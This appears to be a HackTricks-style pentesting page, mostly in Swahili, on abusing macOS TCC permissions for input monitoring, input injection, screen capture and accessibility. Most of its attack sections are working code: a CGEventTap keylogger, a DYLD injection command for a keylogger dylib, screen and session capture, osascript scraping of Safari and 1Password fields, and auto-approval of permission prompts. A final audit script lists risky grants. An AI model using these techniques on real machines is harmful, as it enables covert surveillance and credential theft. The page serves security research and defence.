# Abuse of macOS Input Monitoring, Screen Capture & Accessibility

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Huduma tatu zinazohusiana za TCC hudhibiti jinsi applications zinavyoweza kuchunguza na kuingiliana na desktop session ya mtumiaji:

| TCC Service | Ruhusa | Uwezo |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Kusoma keyboard na mouse events zote katika mfumo mzima (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Kuingiza synthetic keyboard na mouse events |
| `kTCCServiceScreenCapture` | **Screen Capture** | Kusoma display buffer, kupiga screenshots, na kurekodi screen |
| `kTCCServiceAccessibility` | **Accessibility** | Kudhibiti applications nyingine kupitia AXUIElement API na kusoma UI elements |

Ruhusa hizi ni **mchanganyiko hatari zaidi** kwenye macOS — kwa pamoja hutoa:
- Keylogging kamili ya kila keystroke (passwords, messages, credit cards)
- Screen recording ya maudhui yote yanayoonekana
- Synthetic input injection (kubofya buttons na kuidhinisha dialogs)
- Udhibiti kamili wa GUI unaolingana na physical access

---

## Input Monitoring (kTCCServiceListenEvent)

### Jinsi Inavyofanya Kazi

macOS hutumia **`CGEventTap` API** kuruhusu processes kuingilia input events kutoka kwenye Quartz event system. Process yenye ListenEvent permission inaweza kuunda event tap inayopokea **kila keyboard na mouse event** kabla au baada ya kufika kwenye target application.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Kutafuta Binaries zenye Entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging kupitia Code Injection

Ikiwa binary yenye ruhusa ya ListenEvent pia ina **disabled library validation** au **inaruhusu DYLD environment variables**, mshambuliaji anaweza kuingiza dylib inayosajili CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
The injected dylib hurithi ListenEvent TCC grant ya target na kunasa keystrokes zote.

### Attack: Credential Harvesting

Keylogger ya kisasa inaweza kuhusisha keystrokes na application inayotumika:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Uingizaji wa Input (kTCCServicePostEvent)

### Jinsi Inavyofanya Kazi

Ruhusa ya PostEvent inaruhusu kuunda event tap kwa **`kCGEventTapOptionDefault`** (inaweza kurekebisha/kuingiza events) badala ya ListenOnly.<sup>[[1]](#references)</sup> Hii huwezesha:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Attack: Uidhinishaji wa Kiotomatiki wa TCC Prompt

Kwa kutumia PostEvent, mshambuliaji anaweza **kuiga kubofya "Allow"** kwenye dialog za ruhusa za TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Kukamata Skrini (kTCCServiceScreenCapture)

### Jinsi Inavyofanya Kazi

Ruhusa ya kukamata skrini inaruhusu kusoma display buffer kwa kutumia:
- **`CGWindowListCreateImage`** — kukamata dirisha lolote au skrini nzima
- **`ScreenCaptureKit`** (macOS 12.3+) — API ya kisasa ya kutiririsha maudhui ya skrini<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — kukamata skrini kwa kuongeza kasi kwa kutumia hardware
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Kutafuta Wateja wa Screen Capture
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Kukamata Credentials kupitia OCR

Mchakato wa screen capture uliodungwa unaweza kunasa fremu mara kwa mara na kutumia OCR kutoa nywila:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Kuanzia **macOS Sonoma**, screen capture huonyesha **kiashirio kinachoendelea kuonekana** kwenye upau wa menyu. Kwenye matoleo ya zamani, screen recording ingeweza kufanyika bila kutoa dalili yoyote. Hata hivyo, kunasa fremu moja kwa muda mfupi bado kunaweza kutotambuliwa na watumiaji.

### Attack: Session Recording

Screen recording inayoendelea hutoa replay kamili ya session ya mtumiaji:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Ufikivu (kTCCServiceAccessibility)

### Jinsi Inavyofanya Kazi

Ufikiaji wa Ufikivu hutoa udhibiti wa programu nyingine kupitia **AXUIElement API**.<sup>[[2]](#references)</sup> Mchakato wenye ufikivu unaweza:

1. **Kusoma** kipengele chochote cha UI katika programu yoyote (sehemu za maandishi, lebo, vitufe, menyu)
2. **Kubofya** vitufe na kuingiliana na vidhibiti
3. **Kuchapa** maandishi katika sehemu yoyote ya maandishi
4. **Kuelekeza** menyu na madirisha ya mazungumzo
5. **Kukusanya** data inayoonyeshwa kutoka kwa programu yoyote inayoendesha
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

Matumizi mabaya hatari zaidi ya Accessibility ni **kuvinjari System Settings ili kuipa malware yako mwenyewe permissions za ziada**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Shambulio: Ukusanyaji wa Data Kati ya Programu
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attack: Automated User Actions
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Minyororo ya Mashambulizi

### Mnyororo: Input Monitoring + Screen Capture = Ufuatiliaji Kamili
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Msururu: Accessibility + PostEvent = Udhibiti Kamili wa Mbali
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Mnyororo: Accessibility → Kujipa Ruhusa ya Kamera/Mic → Ufuatiliaji
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Utambuzi na Uorodheshaji
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Marejeo

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
